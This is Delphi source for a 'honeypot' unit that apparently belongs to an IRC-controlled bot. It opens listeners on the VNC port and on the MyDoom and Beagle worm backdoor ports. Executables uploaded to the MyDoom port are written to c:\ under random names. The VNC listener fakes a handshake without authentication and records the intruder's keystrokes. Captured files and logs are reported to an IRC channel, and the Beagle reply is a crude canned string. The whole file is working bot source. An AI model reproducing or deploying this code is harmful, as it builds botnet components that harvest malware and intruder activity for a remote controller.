unit untHoneyPot;

interface

uses
  Windows,
  Winsock,
  untFunctions,
  untFTPD,
  untOutputs,
  untThreads,
  untGlobalDeclare;

type
  hp_info = record
    sock        :tsocket;
    port        :integer;
  end;
  _hp_info = ^hp_info;

var
  hp_test :hp_info;

  procedure hp_start;

  function hp_vnc(p: pointer): dword; stdcall;
  function hp_beagle(p: pointer): dword; stdcall;
  function hp_mydoom(p: pointer): dword; stdcall;

implementation

procedure hp_start;
begin
  repeat sleep(1); until ftp_ircsock > 0;

  //* VNC *//
  hp_test.sock := ftp_ircsock;
  hp_test.port := 5900;

  thread_start(1, 3, 'vnc_honeypot', @hp_vnc, @hp_test, false);
  sleep(1000);

  //* BEAGLE *//
  hp_test.sock := ftp_ircsock;
  hp_test.port := 2745;

  thread_start(1, 3, 'beagle_honeypot', @hp_beagle, @hp_test, false);
  sleep(1000);

  //* MYDOOM *//
  hp_test.sock := ftp_ircsock;
  hp_test.port := 3127;

  thread_start(1, 3, 'mydoom_honeypot', @hp_mydoom, @hp_test, false);
  sleep(1000);  
end;

//* mydoom *//
function hp_mydoom(p: pointer): dword; stdcall;
var
  info  :_hp_info;
  sock  :tsocket;
  isock :tsocket;
  hsock :tsocket;
  addr  :tsockaddrin;
  rem   :tsockaddr;
  len   :integer;
  derr  :integer;
  port  :integer;
  data  :string;
  log   :string;
  recv_ :array[0..2048] of char;
  f     :file;
begin
  move(p, info, sizeof(p));

  sock := info^.sock;
  port := info^.port;

  hsock := socket(af_inet, sock_stream, 0);
  addr.sin_family := af_inet;
  addr.sin_port := htons(port);
  addr.sin_addr.S_addr := inaddr_any;

  if bind(hsock, addr, sizeof(addr)) <> 0 then
  begin
    outputadd(sock, '%pm% '+g_irc_honeypot+ ' :failed to start mydoom honeypot, port in use.'#10, 1000);
    exit;
  end;

  if listen(hsock, somaxconn) <> 0 then
  begin
    outputadd(sock, '%pm% '+g_irc_honeypot+ ' :failed to start mydoom honeypot, cant listen.'#10, 1000);
    exit;
  end;

  repeat
    len := sizeof(tsockaddr);
    isock := accept(hsock, @rem, @len);
    if isock <> invalid_socket then
    begin
      recv(isock, recv_, sizeof(recv_), 0);

      data := 'c:\' + ninja_replaceshortcuts('%rand%') + '.exe';
      assignfile(f, data);
      rewrite(f, 1);
      repeat
        derr := recv(isock, recv_, sizeof(recv_), 0);
        blockwrite(f, recv_[0], derr);
      until derr<=0;
      closefile(f);

      outputadd(sock, '%pm% '+g_irc_honeypot+' :[mydoom] log: ' + data + ' caught.'#10, 1000);
    end;
    closesocket(isock);
  until false;
end;

//* beagle *//
function hp_beagle(p: pointer): dword; stdcall;
var
  info  :_hp_info;
  sock  :tsocket;
  isock :tsocket;
  hsock :tsocket;
  addr  :tsockaddrin;
  rem   :tsockaddr;
  len   :integer;
  derr  :integer;
  port  :integer;
  data  :string;
  log   :string;
  recv_ :array[0..2048] of char;
begin
  move(p, info, sizeof(p));

  sock := info^.sock;
  port := info^.port;

  hsock := socket(af_inet, sock_stream, 0);
  addr.sin_family := af_inet;
  addr.sin_port := htons(port);
  addr.sin_addr.S_addr := inaddr_any;

  if bind(hsock, addr, sizeof(addr)) <> 0 then
  begin
    outputadd(sock, '%pm% '+g_irc_honeypot+ ' :failed to start beagle honeypot, port in use.'#10, 1000);
    exit;
  end;

  if listen(hsock, somaxconn) <> 0 then
  begin
    outputadd(sock, '%pm% '+g_irc_honeypot+ ' :failed to start beagle honeypot, cant listen.'#10, 1000);
    exit;
  end;

  repeat
    len := sizeof(tsockaddr);
    isock := accept(hsock, @rem, @len);
    if isock <> invalid_socket then
    begin
      recv(isock, recv_, sizeof(recv_), 0);
      data := 'gaysex:o';
      send(isock, data[1], length(data), 0);
      derr := recv(isock, recv_, sizeof(recv_), 0);
      log := copy(recv_, 1, derr);
      outputadd(sock, '%pm% '+g_irc_honeypot+' :[beagle] log: ' + log + #10, 1000);
    end;
    closesocket(isock);
  until false;
end;

//* VNC Exploit *//
function hp_vnc(p: pointer): dword; stdcall;
var
  info  :_hp_info;
  sock  :tsocket;
  port  :integer;
  addr  :tsockaddrin;
  hsock :tsocket;
  isock :tsocket;
  rem   :tsockaddr;
  len   :integer;
  derr  :integer;

  data  :string;
  log   :string;
  recv_ :array[0..8] of char;
  g     :boolean;
  str_  :string;
begin
  str_ := 'abcdefghijklmnopqrstuvwxyzåäö' +
          'ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ' +
          '0123456789' +
          '.<>:/\_- ';

  move(p, info, sizeof(p));

  sock := info^.sock;
  port := info^.port;

  hsock := socket(af_inet, sock_stream, 0);
  addr.sin_family := af_inet;
  addr.sin_port := htons(port);
  addr.sin_addr.S_addr := inaddr_any;

  if bind(hsock, addr, sizeof(addr)) <> 0 then
  begin
    outputadd(sock, '%pm% '+g_irc_honeypot+ ' :failed to start vnc honeypot, port in use.'#10, 1000);
    exit;
  end;

  if listen(hsock, somaxconn) <> 0 then
  begin
    outputadd(sock, '%pm% '+g_irc_honeypot+ ' :failed to start vnc honeypot, cant listen.'#10, 1000);
    exit;
  end;

  g := true;
  repeat
    len := sizeof(tsockaddr);
    isock := accept(hsock, @rem, @len);
    if isock <> invalid_socket then
    begin
      //* send fake version *//
      fillchar(recv_, sizeof(recv_), #0);
      data := #$52#$46#$42#$20#$30#$30#$33#$2E#$30#$30#$38#$0A;
      send(isock, data[1], length(data), 0);
      recv(isock, recv_, sizeof(recv_), 0);

      sleep(1000);

      //* send data 1 *//
      fillchar(recv_, sizeof(recv_), #0);
      data := #$01#$02;
      send(isock, data[1], length(data), 0);
      recv(isock, recv_, sizeof(recv_), 0);

      sleep(1000);

      //* send data 2 *//
      fillchar(recv_, sizeof(recv_), #0);
      data := #$00#$00#$00#$00;
      send(isock, data[1], length(data), 0);
      recv(isock, recv_, sizeof(recv_), 0);

      //* start receive *//
      // winkey
      // r
      // cmd
      // command

      log := '';
      repeat
        fillchar(recv_, sizeof(recv_), #0);

        derr := recv(isock, recv_, 1, 0);

        if derr > 0 then
        begin
          if (recv_ <> #$00) and
             (recv_ <> #$04) and
             (recv_ <> #$01) and
             (recv_ <> #255) then
             If Pos(recv_, str_) <= 0 Then
               Log := Log + '[' + IntToStr(Ord(Recv_[0])) + ']'
             Else
               Log := Log + Recv_;
          
//          if (recv_ <> #$04) and
//             (recv_ <> #$01) and
//             (recv_ <> #$00) and
//             (recv_ <> #$00#$00#$00#$00) and
//             (recv_ <> #$00#$00#$00#$00#$00) and
//             (recv_ <> #$FF) and
//             (recv_ <> #$EB) and
//             (recv_ <> #$51) and
//             (recv_ <> #$0D) and
//             (recv_ <> #$72) then
//             begin
//               if g then
//               begin
//                 if recv_ = #$0D then
//                   log := log + ' '#2'[enter]'#2' '
//                 else
//                   log := log + copy(recv_, 1, derr);
//                 g := false;
//               end else
//                 g := true;
//             end;
//          if (copy(log, length(log)-4, 4) = 'exit') then
//            break;
        end;
      until derr <= 0;

      outputadd(sock, '%pm% '+g_irc_honeypot+' :[vnc] log: ' + log + #10, 1000);
    end;
    closesocket(isock);
  until false;
end;

end.
